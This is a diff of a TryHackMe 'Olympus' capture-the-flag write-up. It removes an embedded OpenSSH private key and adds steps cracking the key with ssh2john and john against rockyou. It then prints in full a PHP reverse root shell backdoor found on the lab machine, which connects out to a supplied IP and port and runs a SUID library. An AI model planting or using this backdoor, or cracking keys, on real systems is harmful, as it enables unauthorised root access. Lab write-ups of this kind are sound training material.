@@ -1,4 +1,4 @@
-<img width="1129" height="155" alt="image" src="https://github.com/user-attachments/assets/e1fa8969-70ca-41c0-a17c-38a792c7bab4" /># TryHackMe Olympus Writeup
+# TryHackMe Olympus Writeup
 
 ---
 
@@ -231,66 +231,106 @@ find / -perm -u=s -type f 2>/dev/null
 
 
 ```
------BEGIN OPENSSH PRIVATE KEY-----
-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
-eRZjPBIy1rjIUiWe6LS1ToEyqfY=
------END OPENSSH PRIVATE KEY-----
+ssh2john id_rsa > rsa_hash.txt
+john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john rsa_hash.txt --show
+```
 
+<img width="886" height="304" alt="image" src="https://github.com/user-attachments/assets/0afd05e9-9e38-4e10-abb6-d24747f27d50" />
+
+```
+snowflake
 ```
 
 
+<img width="1194" height="209" alt="image" src="https://github.com/user-attachments/assets/ec82cd40-fec7-4845-8cab-7b375562310c" />
 
 
+## now getting root 
+
+> ## after some search and useing linpeas found this file
+
+```
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
+```
 
 
+```php
 
+<?php
+$pass = "a7c5ffcf139742f52a5267c4a0674129";
+if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');
 
+set_time_limit(0);
 
+$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
+if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
+$ip = $_GET["ip"]; $port = $_GET["port"];
 
+$write_a = null;
+$error_a = null;
 
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
 
+chdir("/"); umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if(!$sock) die("couldn't open socket");
 
+$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
+$proc = proc_open($shell, $fdspec, $pipes);
 
+if(!is_resource($proc)) die();
 
+for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
+stream_set_blocking($sock, 0);
 
+while(1)
+{
+    if(feof($sock) || feof($pipes[1])) break;
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
+    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
+    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
+}
 
+fclose($sock);
+for($x=0;$x<=2;$x++) fclose($pipes[x]);
+proc_close($proc);
+?>
 
+```
 
+## after read code and under stand it found that it return shell as root via SUID lib 
+
+```
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
+```
+
+# `run`
+
+```
+uname -a; w; /lib/defended/libc.so.99
+```
+
+<img width="895" height="286" alt="image" src="https://github.com/user-attachments/assets/0beef234-2d09-4348-97d2-78478de8a1f5" />
+
+## find bonus flag
+
+```
+cd /
+grep -irl flag{
+```
+
+<img width="956" height="314" alt="image" src="https://github.com/user-attachments/assets/a93bdd69-ddc2-4e5e-a65b-f6dde21053f5" />
+
+<img width="1004" height="297" alt="image" src="https://github.com/user-attachments/assets/5bb94c1a-a750-4fce-b5c9-e4f4af52f5f5" />
+
+----
+
+![MGIF (2)](https://github.com/user-attachments/assets/45372456-167e-4929-84e5-f551b7722d81)
 
 
 
